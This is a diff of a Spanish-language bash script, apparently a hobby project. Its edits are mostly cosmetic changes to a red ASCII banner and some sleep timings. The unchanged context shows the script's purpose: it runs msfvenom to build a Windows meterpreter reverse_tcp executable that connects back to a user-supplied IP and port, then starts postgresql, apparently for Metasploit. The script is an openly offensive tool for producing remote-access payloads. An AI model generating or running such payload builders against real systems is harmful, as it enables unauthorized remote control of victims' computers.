@@ -13,24 +13,24 @@
 
 
 
-echo -e "\e[1;31m██████████████         ███                █████████████████                ███              \e[0m"                                                  
-echo -e "\r[1;31m██████████████         ███                █████████████████               █████             \r[0m"                                                
-echo -e "\e[1;31m      ███              ███                       ███                     ███ ███            \e[0m"                
-echo -e "\r[1;31m      ███              ███                       ███                    ███   ███           \r[0m"              
-echo -e "\e[1;31m      ███              ███                       ███                   ███     ███          \e[0m"
-echo -e "\r[1;31m      ███              ███                       ███                  █████████████         \r[0m"                       
-echo -e "\e[1;31m      ███              ███                       ███                 ███████████████        \e[0m"         
-echo -e "\r[1;31m      ███              ███                       ███                ███            ███       \r[0m"
-echo -e "\e[1;31m██████████████         ███████████        █████████████████        ███              ███     \e[0m"                   
-echo -e "\r[1;31m██████████████         ███████████        █████████████████       ███                ███    \r[0m"                          
+echo -n -e "\e[1;31m██████████████         ███                █████████████████                ███              \e[0m"                                                  
+echo -n -e "\r[1;31m██████████████         ███                █████████████████               █████             \r[0m"                                                
+echo -n -e "\e[1;31m      ███              ███                       ███                     ███ ███            \e[0m"                
+echo -n -e "\r[1;31m      ███              ███                       ███                    ███   ███           \r[0m"              
+echo -n -e "\e[1;31m      ███              ███                       ███                   ███     ███          \e[0m"
+echo -n -e "\r[1;31m      ███              ███                       ███                  █████████████         \r[0m"                       
+echo -n -e "\e[1;31m      ███              ███                       ███                 ███████████████        \e[0m"         
+echo -n -e "\r[1;31m      ███              ███                       ███                ███            ███       \r[0m"
+echo -n -e "\e[1;31m██████████████         ███████████        █████████████████        ███              ███     \e[0m"                   
+echo -n -e "\r[1;31m██████████████         ███████████        █████████████████       ███                ███    \r[0m"                          
 
-echo -e "Esta es l aprueba final y absoluta la cual esta completamente acabada y pulida.
+echo -n -e "Esta es l aprueba final y absoluta la cual esta completamente acabada y pulida.
 Espero que les guste mi proyecto
 Saludos "
 
 
 
-
+sleep 5s
 
 
 trap ctrl_c INT
@@ -70,9 +70,6 @@ sleep 2s
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe
 
-sleep 2s 
-
-echo
 sleep 2s
 sudo service postgresql start
 sleep 2s 
